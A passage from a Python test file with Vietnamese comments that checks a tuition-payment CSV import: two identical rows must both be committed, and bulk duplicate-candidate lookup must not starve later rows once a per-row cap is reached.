        self, db, seeded_dependencies, admin_user
    ):
        """Xem trước cố ý coi hai dòng giống hệt là hai khoản thu riêng (map dò
        trùng khoá theo row_no). Bước ghi phải nói CÙNG một điều — nếu không thì
        pha ghi thắng và khoản thứ hai rơi mất."""
        await _seed_system_user(db)
        await _seed_cash_method(db)
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                ["001234567890", "Nguyễn Văn An", "5.000.000", "05/09/2026", "TM", "", ""],
                ["001234567890", "Nguyễn Văn An", "5.000.000", "05/09/2026", "TM", "", ""],
            ]
        )
        batch, _ = await pis.preview_import(
            db,
            content=content,
            filename="hai-dong.csv",
            academic_year=2026,
            semester_no=1,
            created_by_id=admin_user.id,
            unit_id=None,
        )
        batch_id = batch.id
        await db.commit()

        result, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        assert result.committed_count == 2, "dòng thứ hai bị chính dòng đầu tố"
        assert result.payment_count == 2

    async def test_tran_dem_theo_TUNG_dong_khong_bo_doi_dong_sau(
        self, db, seeded_dependencies, admin_user
    ):
        """Trần tổng + ORDER BY idx làm dòng đầu ăn hết hạn ngạch, dòng sau nhận
        rỗng và im lặng báo 'không trùng' — đúng chỗ đang cần cảnh báo."""
        from app.repositories.payment_repository import (
            MAX_DUPLICATE_CANDIDATES,
            PaymentRepository,
        )
        from app.models.finance import Payment, PaymentMethod, PaymentStatusEnum

        await _seed_cash_method(db)
        _, fee, invs = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "900000000", "issued", "0", "0")],
        )
        method = (
            await db.execute(select(PaymentMethod).where(PaymentMethod.code == "cash"))
        ).scalars().first()
        khi = datetime(2026, 9, 5, tzinfo=timezone.utc)
        # Nhiều hơn trần MỘT dòng, để nếu hạn ngạch bị tiêu thụ theo thứ tự idx
        # thì dòng thứ hai chắc chắn đói.
        for _ in range(MAX_DUPLICATE_CANDIDATES + 5):
            db.add(
                Payment(
                    invoice_id=invs[0].id,
                    method_id=method.id,
                    amount=Decimal("1000000"),
                    status=PaymentStatusEnum.pending.value,
                    payment_date=khi,
                    created_by_id=admin_user.id,
                )
            )
        await db.commit()

        res = await PaymentRepository(db).find_duplicate_candidates_bulk(
            keys=[(0, fee.id, Decimal("1000000"), khi),
                  (1, fee.id, Decimal("1000000"), khi)]
        )
        assert res.get(1), "dòng thứ hai bị bỏ đói vì dòng đầu ăn hết hạn ngạch"
        assert len(res[0]) == MAX_DUPLICATE_CANDIDATES + 1, "phải lấy dư 1 để biết bị cắt"
        assert len(res[1]) == MAX_DUPLICATE_CANDIDATES + 1
